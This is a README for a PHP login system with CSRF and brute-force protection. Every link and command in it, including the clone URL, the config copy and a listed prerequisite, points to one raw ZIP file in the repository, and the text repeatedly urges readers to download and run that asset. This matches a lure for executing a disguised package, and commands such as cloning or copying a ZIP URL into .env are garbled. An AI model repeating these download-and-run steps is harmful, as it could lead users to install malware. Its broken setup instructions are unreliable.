# PHP Secure Auth: Modern PHP Login System with CSRF and Brute-Force Protection

[![Latest release](https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip)](https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip)

A modern and secure PHP authentication system with a sleek UI, CSRF protection, and brute-force mitigation. This project focuses on robustness, clarity, and usability. It uses PDO for database access, protects against common web threats, and presents a clean admin and user interface powered by Tailwind CSS.

Note: For access to the official release assets, visit the Releases page linked above. From that page, download and run the appropriate release asset to install or upgrade. The Releases page provides the latest stable builds and installers.

---

Images and visuals
- UI preview and design inspiration: a simple, clean interface that emphasizes usability and accessibility. 
- Live UI components are driven by Tailwind CSS to keep styling consistent, responsive, and fast.
- UI mockups and status indicators appear as part of the documentation to help you understand the look and feel.

Emojis
- 🔐 for security and encryption
- 🛡️ for protection
- 🧭 for secure navigation
- 🧰 for the toolkit
- 🧪 for testing
- 💡 for best practices

Repository overview
- Name: PHP Secure Auth
- Core goal: Provide a secure, maintainable, and easy-to-integrate authentication system for PHP applications
- Key features: CSRF protection, brute-force mitigation, SQL injection prevention, a modern UI, and a clean API for integration
- Tech vibe: Modern PHP8+ codebase, PDO for database access, Tailwind CSS for UI, and security-first defaults

Topics
- authentication, brute-force-protection, csrf-protection, login-system, modern-ui, pdo, php, secure-authentication, security, sql-injection-prevention, tailwind-css

---

Table of contents
- Quick start
- What this project does
- Core design and architecture
- Security and threat model
- Database schema and migrations
- Installation and setup
- Configuration and deployment
- Usage patterns and flows
- UI and theming
- Testing and quality assurance
- Performance and scalability
- Accessibility and internationalization
- Development workflow
- Contribution guidelines
- Roadmap
- Licensing
- FAQ and troubleshooting

---

What this project does
PHP Secure Auth provides a ready-to-use authentication stack for PHP applications. It emphasizes a safety-first approach without sacrificing developer ergonomics. It includes:
- A secure login workflow with rate limiting and account protection
- CSRF protection for all forms and critical actions
- Password storage using modern hashing algorithms with pepper and salt considerations
- Safe session handling and secure cookies
- A responsive, accessible UI built with Tailwind CSS
- A data access layer based on PDO to prevent SQL injection
- Clear separation between UI, business logic, and data access

How it works in practice
- Users access a login page that presents a minimal, accessible form. The form uses a CSRF token that is generated server-side and validated on submission.
- If the credentials are correct, a session is created with a strong session ID, and a secure cookie is set. The user is redirected to a protected area.
- If the credentials are incorrect, the system increments a per-user or per-network IP attempt counter and triggers a cooldown or temporary lockout after a configurable threshold.
- All sensitive actions (like password reset or account updates) require CSRF validation and proper permission checks.
- The system uses prepared statements to guard against SQL injection and hashes passwords with a strong algorithm (e.g., password_hash with PASSWORD_BCRYPT or PASSWORD_ARGON2I, depending on PHP version and environment).
- The UI is responsive and accessible, with clear focus styles and high-contrast modes.

Core design and architecture
- Separation of concerns: The codebase separates routing, business logic, data access, and presentation. This reduces coupling and improves testability.
- Database access layer: A thin PDO wrapper enforces prepared statements, parameter binding, and error handling. This provides a consistent path for queries and helps prevent injection vulnerabilities.
- Security-first defaults: CSRF tokens, anti-replay protections, secure cookies, and strict session handling are built in and configurable.
- Extensible UI: The frontend uses Tailwind CSS for rapid styling and theming. It is designed to be replaced or extended without touching core authentication logic.
- Local testing and portability: The code is written to be portable across common PHP stacks and can be tested locally with minimal setup.

Security and threat model
- CSRF protection: Every non-idempotent action is guarded by a CSRF token. Token validation happens on the server side before any state-changing operation is performed.
- Brute-force mitigation: Login attempts are tracked per user and IP, with adaptive cooldowns. After a configurable number of failed attempts, further attempts are throttled or temporarily blocked.
- Password management: Passwords are stored using strong hashing algorithms with automatic rehashing when the library detects a better algorithm. Password resets require verification and time-bound tokens.
- SQL injection prevention: All queries use prepared statements. Input is validated and sanitized, with strong typing where possible.
- Session security: Sessions are tied to server-side storage when available, with secure cookies, HTTP-only flags, and strict session lifetimes. Session regeneration happens on privilege changes.
- XSS protection: Output escaping is applied where data is displayed, and content security policies are considered for inline scripts and resources.
- Access control: Roles and permissions are defined to control who can access certain routes. Sensitive actions require appropriate permissions.

Database schema and migrations
- Core tables typically include:
  - users: stores user_id, username, email, password_hash, created_at, last_login, status
  - login_attempts: stores attempt_id, ip_address, user_id (nullable), attempt_time, success
  - sessions: stores session_id, user_id, last_activity, ip_address, user_agent
  - reset_tokens: stores token, user_id, expires_at, used
  - roles and user_roles: optional for advanced access control
- Migrations come with a versioned history. They can be executed via a migration tool or a simple SQL script depending on the deployment approach.
- Example workflow: Create the database, run the migrations, seed with an initial admin user, and configure application settings.

Installation and setup
Prerequisites
- PHP 8.0+ (prefer PHP 8.1 or newer for best security features)
- Composer
- A relational database (MySQL/MariaDB or PostgreSQL)
- https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip and npm (for asset building, if you want to customize Tailwind CSS)

Initial steps
- Clone the repository:
  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
- Install PHP dependencies:
  - `cd PHP-Secure-Auth && composer install`
- Install frontend dependencies (Tailwind CSS tooling):
  - `cd assets && npm install && npm run build` (or `npm run dev` for development)
- Create and configure environment variables
  - Copy the example config: `cp https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip .env`
  - Edit `.env` to set your database connection details, app URL, and security keys
- Prepare the database
  - Create the database schema using the provided SQL migrations
  - Run migrations to set up tables
- Run the built-in server or configure a web server
  - Quick start: `php -S 127.0.0.1:8000 -t public`
  - Or configure Apache/Nginx to serve the public directory

Configuration and deployment
- Environment variables and their purposes:
  - APP_ENV: development or production
  - APP_URL: base URL for redirects and links
  - DB_DSN, DB_USER, DB_PASSWORD: Data source credentials
  - SECRET_KEY or APP_SECRET: used to sign CSRF tokens and sessions
  - SESSION_LIFETIME: in minutes
  - LOGIN_ATTEMPT_LIMIT: maximum failed attempts before cooldown
  - LOCKOUT_DURATION: cooldown duration in seconds or minutes
  - HASH_ALGO: preferred password hashing algorithm (bcrypt or Argon2)
  - TRUSTED_PROXIES: to deal with reverse proxy setups if necessary
- Security hardening
  - Serve assets and pages over HTTPS
  - Enable HTTP Strict Transport Security (HSTS)
  - Use secure and HTTP-only cookies
  - Consider Content Security Policy (CSP) headers to limit scripts and resources
  - Keep PHP and dependencies up to date
- Deployment considerations
  - Use a dedicated database user with limited privileges
  - Enable automatic backups and a rollback plan
  - Monitor login activity and set up alerts for anomalies
  - Regularly review dependencies for security advisories
  - Implement a logging strategy that protects sensitive data

Usage patterns and flows
- User flows
  - Registration (if enabled)
  - Login with CSRF protection and rate limiting
  - Password reset workflow with secure tokens
  - Logout and session invalidation
  - Profile management with role-based access control
- Administrator flows
  - User management: create, block, unlock accounts
  - View authentication events and failed attempts
  - Manage application settings and security policies
- API integration
  - The system exposes secure endpoints for login status and session checks
  - It also provides hooks or adapters to integrate with existing user stores
  - Use prepared statements and proper input validation in any custom integration
- UI considerations
  - The UI is responsive and accessible, with clear focus indicators
  - Form fields include inline validation messages and CSRF-aware error handling
  - Color themes are designed to be visually distinct in both light and dark modes
  - The UI follows a minimal pattern that reduces cognitive load

UI and theming
- Tailwind CSS-driven UI
  - Clean typography and spacing scales
  - Consistent component library for forms, buttons, and alerts
  - Utility-first approach makes it easy to customize
- Theming and customization
  - Adjust color palettes via Tailwind configuration
  - Adapt spacing and typography to match your brand
  - Localize strings for international users
- Accessibility
  - Keyboard navigable forms
  - Screen reader friendly labels and ARIA attributes
  - Sufficient color contrast and scalable typography

Testing and quality assurance
- Testing philosophy
  - Tests cover authentication flows, edge cases, and security checks
  - Tests run in isolated environments to avoid side effects
  - Continuous integration is encouraged
- Test suites
  - Unit tests for core components: password hashing, token validation, and session handling
  - Integration tests for login flow and CSRF validation
  - End-to-end tests that simulate real user interactions
- Running tests locally
  - Use `vendor/bin/phpunit` after installing dependencies
  - Set test configuration in a dedicated environment file to avoid interfering with production data
- Static analysis and code quality
  - Run PHPStan or Psalm for static analysis
  - Use PHP_CodeSniffer to enforce coding standards
  - Keep dependencies up to date and review security advisories

Performance and scalability
- Caching strategies
  - Optional caching of user sessions or common queries to reduce database load
  - Use server-side cache or an in-memory store if needed
- Database interaction
  - Use prepared statements to minimize query overhead and improve security
  - Optimize indices on frequently queried columns (username, email, status)
- Session management
  - Sessions can be stored in files, in-memory, or a shared store depending on deployment
  - Regenerate session IDs upon login to mitigate session fixation
- Frontend performance
  - Tailwind builds produce lean CSS
  - Lazy load assets where possible
  - Compress assets and enable proper caching headers

Localization and accessibility
- Internationalization
  - Strings are designed to be translated with minimal code changes
  - Easy to add language packs for UI and error messages
- Accessibility
  - All interactive elements have visible focus states
  - Form error messages are exposed to assistive technologies
  - Semantic HTML structure with meaningful headings and landmarks

Directory structure (high level)
- app/
  - Core business logic, services, and managers
- public/
  - Front controller, assets, and web-facing entry points
- resources/
  - Templates, language files, and UI components
- src/
  - Data access layer, models, and domain logic
- tests/
  - PHPUnit tests and fixtures
- config/
  - Environment and application configuration
- migrations/
  - Database migration scripts
- assets/
  - Tailwind config, CSS, and JavaScript for UI

Development workflow
- Cloning and setup
  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
  - `cd PHP-Secure-Auth`
  - `composer install`
  - `npm install` (if you plan to customize Tailwind CSS)
  - Copy and edit `.env` as needed
- Branching model
  - Use feature branches for new work
  - Create a pull request to merge into main or a release branch
  - Include clear, small commits with descriptive messages
- Testing and QA
  - Run unit and integration tests locally
  - Validate security features with basic tests
  - Confirm UI responsiveness and accessibility in multiple browsers
- Documentation and examples
  - Provide example configurations and usage snippets
  - Keep diagrams and flowcharts up to date

Contributing
- How to contribute
  - Fork the repository
  - Create a feature branch with a descriptive name
  - Implement, test, and document changes
  - Submit a pull request with a concise description of the changes
- Code style and quality
  - Follow the project’s coding standards
  - Include tests for new features
  - Update documentation when needed
- Collaboration guidelines
  - Be respectful and constructive
  - Report issues with precise steps to reproduce
  - Propose enhancements with a clear rationale

Roadmap
- Short-term goals
  - Improve multi-language support and accessibility
  - Add more granular role-based access controls
  - Introduce an optional headless API for mobile apps
- Medium-term goals
  - Integrate with external identity providers via OAuth2
  - Enhance auditing and logging with structured events
  - Implement guilded tests for resilience against common attacks
- Long-term goals
  - Provide a scalable, enterprise-ready deployment guide
  - Expand to support additional PDO drivers and databases
  - Enable more advanced security features like adaptive authentication

Releases and downloads
- Access the latest builds at the official Releases page: https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip
- From that page, download the release asset that matches your environment and run it to install or upgrade
- If you need a specific version, the release history lists all tagged versions with notes describing what changed
- For convenience, you can also rely on a GitHub badge that links to the same releases page

Downloads and asset guidance
- Important: The Releases page contains a packaged asset. Because the link has a path, the file you download should be executed or installed according to the asset's instructions. Ensure you follow the provided README or installer guide on that page for a safe setup.
- Remember to verify checksums if provided on the Releases page and to follow best practices for deploying code in a production environment

Link reminder
- For ongoing updates and new versions, revisit the official Releases page at https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip

License
- MIT License
- Permissions and limitations are described in the LICENSE file included with the project
- The licensing choice aligns with community standards for PHP projects and open-source collaboration

Changelog
- A concise log of changes, improvements, and fixes for each release
- Helps you track features and security improvements over time
- See the Releases page for detailed notes and version history

FAQ and troubleshooting
- How do I enable CSRF protection?
  - CSRF tokens are generated per session and embedded in forms. Submissions must include the token, and the server validates it before any state-changing action is performed.
- How does brute-force protection work?
  - The system tracks failed login attempts from users and IP addresses, then applies cooldowns after a configurable threshold.
- How should I handle password resets?
  - Password reset uses time-limited tokens sent via email. The token is validated before allowing a password change.
- What about SQL injection prevention?
  - Every query uses prepared statements with bound parameters to keep data separation clean and safe.
- How can I customize the UI theme?
  - Tailwind CSS is used for styling. You can adjust the palette, typography, and spacing through the Tailwind configuration.

Images and references
- UI and security-inspired visuals accompany this README to illustrate the design and flow
- Live assets and visuals are aligned with Tailwind CSS concepts and modern UI design

Appendix: Quick start commands (for reference)
- Clone the repo
  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
- Install dependencies
  - `composer install`
  - If you plan to customize the UI: `cd assets && npm install`
- Configure and run
  - `cp https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip .env`
  - Edit `.env` with your database and app settings
  - Set up the database and run migrations
  - Start the built-in server: `php -S 127.0.0.1:8000 -t public`
- Build frontend assets
  - `cd assets && npm run build` (or `npm run dev` for development)

End of document
